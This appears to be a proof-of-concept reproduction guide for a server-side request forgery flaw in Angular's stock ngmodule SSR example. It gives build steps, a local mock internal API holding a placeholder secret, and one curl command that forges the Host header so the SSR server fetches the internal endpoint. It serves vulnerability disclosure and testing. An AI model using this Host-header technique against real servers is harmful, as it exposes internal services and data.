# SSRF repro using stock ngmodule SSR example (bundle variant)

Goal: demonstrate Host‑header‑driven SSRF using the **stock** ngmodule SSR example (`integration/platform-server/projects/ngmodule`).

## Requirements
- An Angular repo checkout (any recent main or release branch).
- This bundle provides the mock API and steps; the SSR server is from the Angular repo.

## Setup (terminal A)
```bash
export ANGULAR_REPO=/path/to/angular
corepack pnpm -C "$ANGULAR_REPO/integration/platform-server" install
corepack pnpm -C "$ANGULAR_REPO/integration/platform-server" build:ngmodule
corepack pnpm -C "$ANGULAR_REPO/integration/platform-server" serve:ngmodule
```

This starts the SSR server at `http://127.0.0.1:4206/`.

## Internal mock API (terminal B)
From the bundle root:
```bash
npm run run:stock:api
```

This starts an internal server at `http://127.0.0.1:4401/api-2` that returns `{data: "INTERNAL_SECRET_123"}`.

## Exploit demo (terminal C)
```bash
curl -H 'Host: 127.0.0.1:4401' http://127.0.0.1:4206/http-transferstate-lazy
```

Expected outcome:
- The SSR HTML contains `INTERNAL_SECRET_123` in the `.two` div.
- This shows SSR resolved `/api-2` against the attacker‑controlled Host header.

## Notes
- The stock example constructs `url` from `headers.host`.
- No changes to the example are required; only the mock API is supplied by this bundle.
